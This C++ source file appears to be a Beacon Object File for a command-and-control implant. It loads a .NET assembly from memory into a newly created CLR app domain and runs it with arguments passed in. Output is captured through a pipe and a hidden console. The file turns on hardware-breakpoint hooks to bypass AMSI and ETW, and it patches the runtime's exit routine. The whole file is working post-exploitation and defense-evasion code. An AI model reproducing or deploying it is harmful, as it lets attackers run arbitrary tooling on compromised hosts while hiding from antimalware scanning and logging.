#include <General.hpp>
#include <Dotnet/Utils.cc>
#include <Dotnet/PatchExit.cc>
#include <Hooks/Hwbp.cc>

using namespace mscorlib;

auto Dotnet::Inline(
    _In_ BYTE* AsmBytes,
    _In_ ULONG AsmLength,
    _In_ PWSTR Arguments,
    _In_ PWSTR AppDomName,
    _In_ PWSTR Version,
    _In_ BOOL  KeepLoad
) -> BOOL {
    Printf( "Assembly bytes at %p [%d bytes]", AsmBytes, AsmLength );
    Printf( "Arguments %S", Arguments );
    Printf( "Using app domain %S", AppDomName );
    Printf( "Version: %S", Version );

    PWCHAR* AsmArgv   = { nullptr };
    ULONG   AsmArgc   = { 0 };
    BOOL    Success   = FALSE;
    HANDLE  BackupOut = INVALID_HANDLE_VALUE;
    HANDLE  PipeWrite = INVALID_HANDLE_VALUE;
    HANDLE  PipeRead  = INVALID_HANDLE_VALUE;
    HWND    WinHandle = nullptr;
    PVOID   Output    = nullptr;
    ULONG   OutLen    = 0;

    SAFEARRAYBOUND SafeBound = { 0 };
    SAFEARRAY*     SafeAsm   = { nullptr };
    SAFEARRAY*     SafeExpc  = { nullptr };
    SAFEARRAY*	   SafeArgs  = { nullptr };

    WCHAR FmVersion[MAX_PATH] = { 0 };
    ULONG FmBuffLen = MAX_PATH;

    BOOL             IsLoadable  = FALSE;
    HRESULT          HResult     = 0;
    VARIANT          VariantArgv = { 0 };
    IAssembly*       Assembly    = { nullptr };
    IAppDomain*      AppDom      = { nullptr };
    IMethodInfo*     MethodInfo  = { nullptr };
    IUnknown*        AppDomThunk = { nullptr };
    IUnknown*        EnumRtm     = { nullptr };
    IEnumUnknown*    EnumUkwn    = { nullptr };
    ICLRMetaHost*    MetaHost    = { nullptr };
    ICLRRuntimeInfo* RtmInfo     = { nullptr };
    ICorRuntimeHost* RtmHost     = { 0 };

    LONG Idx = 0;

    SECURITY_ATTRIBUTES SecAttr = { 0 };

    HResult = CLRCreateInstance( 
        CLSID.CLRMetaHost, IID.ICLRMetaHost, (PVOID*)&MetaHost 
    );
    if ( HResult || !MetaHost ) goto _BOF_END;

    //
    //  get the last version if parameters is not passed
    //
    if ( ( Str::CompareW( Version, L"v0.0.00000" ) == 0 ) ) {
        HResult = MetaHost->EnumerateInstalledRuntimes( &EnumUkwn );
        if ( HResult ) goto _BOF_END;

        while ( EnumUkwn->Next( 1, &EnumRtm, 0 ) == S_OK) {
            if ( !EnumRtm ) continue;
    
            if ( SUCCEEDED( EnumRtm->QueryInterface( IID.ICLRRuntimeInfo, (PVOID*)&RtmInfo) ) && RtmInfo ) {
                
                if ( SUCCEEDED( RtmInfo->GetVersionString( FmVersion, &FmBuffLen ) ) ) {
                    Version = FmVersion;
                    Printf("supported version: %S", FmVersion);
                }
            }
        }
    }

    HResult = MetaHost->GetRuntime( Version, IID.ICLRRuntimeInfo, (PVOID*)&RtmInfo );
    if ( HResult ) goto _BOF_END;

    //
    // check if runtime is loadable
    //
    HResult = RtmInfo->IsLoadable( &IsLoadable );
    Printf( "Is loadable: %s", IsLoadable ? "True" : "False" );
    if ( HResult || !IsLoadable ) goto _BOF_END;

    //
    // load clr version
    //
    HResult = RtmInfo->GetInterface( 
        CLSID.CorRuntimeHost, IID.ICorRuntimeHost, (PVOID*)&RtmHost 
    );
    if ( HResult ) goto _BOF_END;

    //
    // start the clr loaded
    //
    HResult = RtmHost->Start();
    if ( HResult ) goto _BOF_END;

    //
    // create the app domain
    //
    HResult = RtmHost->CreateDomain( AppDomName, 0, &AppDomThunk );
    if ( HResult ) goto _BOF_END;

    HResult = AppDomThunk->QueryInterface( IID.AppDomain, (PVOID*)&AppDom );
    if ( HResult ) goto _BOF_END;

    SafeBound = { AsmLength, 0 };
    SafeAsm   = SafeArrayCreate( VT_UI1, 1, &SafeBound );

    //
    // copy the dotnet assembly to safe array
    //
    Mem::Copy<PVOID>( SafeAsm->pvData, AsmBytes, AsmLength );

    //
    // active hwbp to bypass amsi/etw
    //
    if ( Dotnet::Bypass ) {
        Hwbp::DotnetInit();
    }

    //
    // load the dotnet
    //
    HResult = AppDom->Load_3( SafeAsm, &Assembly );
    if ( HResult ) goto _BOF_END;

    //
    // get the entry point
    //
    HResult = Assembly->get_EntryPoint( &MethodInfo );
    if ( HResult ) goto _BOF_END;

    //
    // get the parameters requirements
    //
    HResult = MethodInfo->GetParameters( &SafeExpc );
    if ( HResult ) goto _BOF_END;

    //
    // work with parameters requirements and do it
    //
	if ( SafeExpc ) {
		if ( SafeExpc->cDims && SafeExpc->rgsabound[0].cElements ) {
			SafeArgs = SafeArrayCreateVector( VT_VARIANT, 0, 1 );

			if ( Arguments ) {
                if ( Str::LengthW( Arguments ) ) {
                    AsmArgv = CommandLineToArgvW( Arguments, (PINT)&AsmArgc );
                }
			}

			VariantArgv.parray = SafeArrayCreateVector( VT_BSTR, 0, AsmArgc );
			VariantArgv.vt     = ( VT_ARRAY | VT_BSTR );

			for ( Idx = 0; Idx < AsmArgc; Idx++ ) {
				SafeArrayPutElement( VariantArgv.parray, &Idx, SysAllocString( AsmArgv[Idx] ) );
			}

			Idx = 0;
			SafeArrayPutElement( SafeArgs, &Idx, &VariantArgv );
			SafeArrayDestroy( VariantArgv.parray );
		}
	}

    //
    // set the output console
    //

    SecAttr = { sizeof( SECURITY_ATTRIBUTES ), nullptr, TRUE };

    CreatePipe( &PipeRead, &PipeWrite, &SecAttr, PIPE_BUFFER_LENGTH );

    WinHandle = GetConsoleWindow();

    if ( !WinHandle ) {
        AllocConsole();

        if ( ( WinHandle = GetConsoleWindow() ) ) {
            ShowWindow( WinHandle, SW_HIDE );
        }
    }

    BackupOut = GetStdHandle( STD_OUTPUT_HANDLE );
    SetStdHandle( STD_OUTPUT_HANDLE, PipeWrite );

    Printf( "invoking .NET assembly" );

    //
    // Patch Exit routine
    //
    if ( Dotnet::ExitBypass ) {
        Dotnet::PatchExit( RtmHost );
    }

    //
    // invoke/execute the dotnet assembly
    //
    HResult = MethodInfo->Invoke_3( VARIANT(), SafeArgs, nullptr );
    if ( HResult ) goto _BOF_END;

    //
    // desactive hwbp to bypass amsi/etw
    //
    if ( Dotnet::Bypass ) {
        Hwbp::DotnetExit();
    }

    //
    // allocate memory to output buffer
    //
    Output = Mem::Alloc<PVOID>( PIPE_BUFFER_LENGTH );

    Printf( "start read output of the assembly" );

    //
    // read the output
    //
    Success = ReadFile( PipeRead, Output, PIPE_BUFFER_LENGTH, &OutLen, nullptr );

    Printf( "dotnet asm output [%d bytes]\n\n %s", OutLen, Output );
_BOF_END:
    if ( HResult ) {    
        LPSTR errorMessage = nullptr;
        DWORD flags = 
            FORMAT_MESSAGE_ALLOCATE_BUFFER | 
            FORMAT_MESSAGE_FROM_SYSTEM | 
            FORMAT_MESSAGE_IGNORE_INSERTS;
    
        DWORD result = FormatMessageA(
            flags, nullptr, HResult,MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
            (LPSTR)&errorMessage, 0, nullptr
        );
    
        if ( result > 0 && errorMessage != nullptr ) {
            Printf("Erro (HRESULT 0x%08X): %s\n", HResult, errorMessage);
        }
    
        if ( errorMessage != nullptr ) {
            // Self->Hp->Free( errorMessage );
        }
    }

    if ( BackupOut ) SetStdHandle( STD_OUTPUT_HANDLE, BackupOut );

    if ( GetConsoleWindow() ) FreeConsole();

    if ( AsmArgv ) {
        Mem::Free( AsmArgv ); AsmArgv = nullptr;
    }

    if ( SafeAsm ) {
        SafeArrayDestroy( SafeAsm ); SafeAsm = nullptr;
    }

    if ( SafeArgs ) {
        SafeArrayDestroy( SafeArgs ); SafeArgs = nullptr;
    }

    if ( MethodInfo ) {
        MethodInfo->Release();
    }

    if ( RtmInfo ) {
        RtmInfo->Release();
    }

    if ( !KeepLoad ) {
        RtmHost->UnloadDomain( AppDomThunk );
    } 

    if ( RtmHost ) {
        RtmHost->Release();
    }

    return HResult;
}

EXTERN_C
auto go( CHAR* Args, INT32 Argc ) -> VOID {
    Data Parser = { 0 };

    BeaconDataParse( &Parser, Args, Argc );

    INT32  Length    = 0;
    BYTE*  Buffer    = (BYTE*)BeaconDataExtract( &Parser, &Length );
    WCHAR* Arguments = (WCHAR*)BeaconDataExtract( &Parser, 0 );
    WCHAR* AppDomain = (WCHAR*)BeaconDataExtract( &Parser, 0 );;
    WCHAR* FmVersion = (WCHAR*)BeaconDataExtract( &Parser, 0 );;
    ULONG  Bypass    = BeaconDataInt( &Parser );
    BOOL   PatchExit = BeaconDataInt( &Parser );
    BOOL   Keep      = BeaconDataInt( &Parser );

    Dotnet::Bypass     = Bypass;
    Dotnet::ExitBypass = PatchExit;

    Dotnet::Inline( Buffer, Length, Arguments, AppDomain, FmVersion, Keep );
}